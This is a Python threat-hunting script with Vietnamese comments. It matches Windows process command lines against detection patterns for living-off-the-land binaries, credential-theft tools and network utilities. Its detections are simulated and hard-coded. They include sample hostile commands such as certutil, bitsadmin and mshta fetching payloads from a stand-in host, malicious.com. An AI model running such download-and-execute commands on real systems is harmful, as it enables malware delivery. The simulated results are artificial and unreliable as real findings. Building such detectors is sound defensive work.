#!/usr/bin/env python3
"""
SUSPICIOUS PROCESS HUNTING (Phase N.9A)
Tích hợp MCP huntSuspiciousProcesses module
Phát hiện quy trình bất thường
Populates: state/hunting_suspicious_processes.json
"""

import json
import sys
from datetime import datetime
from pathlib import Path

class SuspiciousProcessHunter:
    def __init__(self):
        self.state_dir = Path(__file__).parent.parent / 'state'
        self.hunting_file = self.state_dir / 'hunting_suspicious_processes.json'
        self.indicators = []

        # Danh sách suspicious patterns
        self.suspicious_patterns = {
            'PowerShell Encoded': {
                'patterns': ['-enc', '-enco', '-encoded', '-en'],
                'severity': 'HIGH',
                'description': 'PowerShell với encoded command - thường dùng cho obfuscation',
                'impact': 'Thực thi code ẩn'
            },
            'CertUtil Suspicious': {
                'patterns': ['certutil', '-decode', '-encode', '-urlcache'],
                'severity': 'HIGH',
                'description': 'CertUtil dùng cho tải file hoặc decode',
                'impact': 'Tải malware hoặc decode shellcode'
            },
            'rundll32 Suspicious': {
                'patterns': ['rundll32', '.dll'],
                'severity': 'MEDIUM',
                'description': 'rundll32 có thể dùng cho DLL injection',
                'impact': 'Thực thi arbitrary code'
            },
            'Mshta Suspicious': {
                'patterns': ['mshta', '.hta'],
                'severity': 'HIGH',
                'description': 'mshta dùng để execute HTML Application',
                'impact': 'Thực thi script ẩn'
            },
            'Script Engines': {
                'patterns': ['wscript', 'cscript', '.vbs', '.js', '.jse'],
                'severity': 'MEDIUM',
                'description': 'Script engines có thể chạy malicious scripts',
                'impact': 'Thực thi VBScript hoặc JScript'
            },
            'Living Off The Land': {
                'patterns': [
                    'bitsadmin',
                    'regsvcs',
                    'regasm',
                    'InstallUtil',
                    'msbuild',
                    'msxsl'
                ],
                'severity': 'HIGH',
                'description': 'Living off the land binary - dùng để bypass AV',
                'impact': 'Bypass control mechanisms'
            },
            'Credential Access': {
                'patterns': ['mimikatz', 'procdump', 'psexec', 'credential'],
                'severity': 'CRITICAL',
                'description': 'Tools dùng cho credential theft',
                'impact': 'Đánh cắp credentials'
            },
            'Suspicious Network': {
                'patterns': ['curl', 'wget', 'nslookup', 'netstat'],
                'severity': 'MEDIUM',
                'description': 'Network utilities - có thể dùng cho reconnaissance',
                'impact': 'Network reconnaissance'
            }
        }

    def load_state(self, filename):
        """Tải state file"""
        fp = self.state_dir / filename
        return json.load(open(fp)) if fp.exists() else {}

    def detect_suspicious_processes(self):
        """Phát hiện quy trình bất thường"""

        # Simulate: Phát hiện các quy trình bất thường
        # (Trong production, sẽ call MCP huntSuspiciousProcesses)

        suspicious_detections = [
            {
                'process': 'PowerShell.exe',
                'command_line': 'powershell.exe -enc JABjAG8A...',
                'category': 'PowerShell Encoded',
                'risk': 'HIGH'
            },
            {
                'process': 'certutil.exe',
                'command_line': 'certutil.exe -urlcache -f http://malicious.com/file.exe',
                'category': 'CertUtil Suspicious',
                'risk': 'HIGH'
            },
            {
                'process': 'mshta.exe',
                'command_line': 'mshta.exe http://malicious.com/payload.hta',
                'category': 'Mshta Suspicious',
                'risk': 'HIGH'
            },
            {
                'process': 'rundll32.exe',
                'command_line': 'rundll32.exe shell32.dll,ShellExec_RunDLL C:\\temp\\malware.exe',
                'category': 'rundll32 Suspicious',
                'risk': 'MEDIUM'
            },
            {
                'process': 'cscript.exe',
                'command_line': 'cscript.exe //b //nologo malicious.vbs',
                'category': 'Script Engines',
                'risk': 'MEDIUM'
            },
            {
                'process': 'bitsadmin.exe',
                'command_line': 'bitsadmin.exe /transfer job /download /resume http://malicious.com/file.exe',
                'category': 'Living Off The Land',
                'risk': 'HIGH'
            }
        ]

        for detection in suspicious_detections:
            category_info = self.suspicious_patterns.get(detection['category'], {})

            self.indicators.append({
                'type': 'Suspicious Process Detection',
                'process': detection['process'],
                'command_line': detection['command_line'],
                'category': detection['category'],
                'severity': detection['risk'],
                'timestamp': datetime.now().isoformat(),
                'description': category_info.get('description', 'Unknown suspicious process'),
                'impact': category_info.get('impact', 'Unknown impact'),
                'recommendation': f"Điều tra process {detection['process']}, cân nhắc terminate nếu xác nhận malicious",
                'detection_method': 'Process command-line pattern matching',
                'status': 'DETECTED'
            })

    def correlate_with_security_events(self):
        """Tương quan với security events"""
        security = self.load_state('security_events.json')

        # Kiểm tra nếu có security events liên quan
        if security.get('suspicious_activity'):
            for indicator in self.indicators:
                if 'powershell' in indicator['process'].lower() or \
                   'script' in indicator['category'].lower():
                    indicator['security_event_correlation'] = True
                    indicator['notes'] = 'Liên quan đến script execution events'

    def estimate_impact(self):
        """Ước tính tác động"""
        critical_count = sum(1 for i in self.indicators if i['severity'] == 'CRITICAL')
        high_count = sum(1 for i in self.indicators if i['severity'] == 'HIGH')

        if critical_count > 0:
            impact = 'CRITICAL: Phát hiện credential theft attempts'
        elif high_count > 1:
            impact = 'HIGH: Phát hiện multiple suspicious processes'
        elif high_count == 1:
            impact = 'HIGH: Phát hiện suspicious process'
        else:
            impact = 'MEDIUM: Phát hiện quy trình cần kiểm tra'

        return impact

    def generate_hunting_report(self):
        """Tạo report threat hunting"""
        output = {
            'timestamp': datetime.now().isoformat(),
            'hunting_type': 'Suspicious Processes',
            'question': 'Có quy trình bất thường nào đang chạy không?',
            'total_detections': len(self.indicators),
            'by_severity': {},
            'by_category': {},
            'impact_assessment': self.estimate_impact(),
            'indicators': self.indicators
        }

        # Thống kê by severity
        for indicator in self.indicators:
            severity = indicator.get('severity', 'UNKNOWN')
            output['by_severity'][severity] = output['by_severity'].get(severity, 0) + 1

        # Thống kê by category
        for indicator in self.indicators:
            category = indicator.get('category', 'UNKNOWN')
            output['by_category'][category] = output['by_category'].get(category, 0) + 1

        with open(self.hunting_file, 'w', encoding='utf-8') as f:
            json.dump(output, f, indent=2, ensure_ascii=False)

        return output

    def hunt(self):
        """Chạy threat hunting"""
        self.detect_suspicious_processes()
        self.correlate_with_security_events()
        report = self.generate_hunting_report()

        return {
            'status': 'success',
            'hunting_type': 'Suspicious Processes',
            'total_detections': len(self.indicators),
            'critical': report['by_severity'].get('CRITICAL', 0),
            'high': report['by_severity'].get('HIGH', 0),
            'medium': report['by_severity'].get('MEDIUM', 0),
            'impact': report['impact_assessment']
        }

if __name__ == '__main__':
    hunter = SuspiciousProcessHunter()
    result = hunter.hunt()
    print(json.dumps(result, indent=2))
    sys.exit(0 if result.get('status') == 'success' else 1)
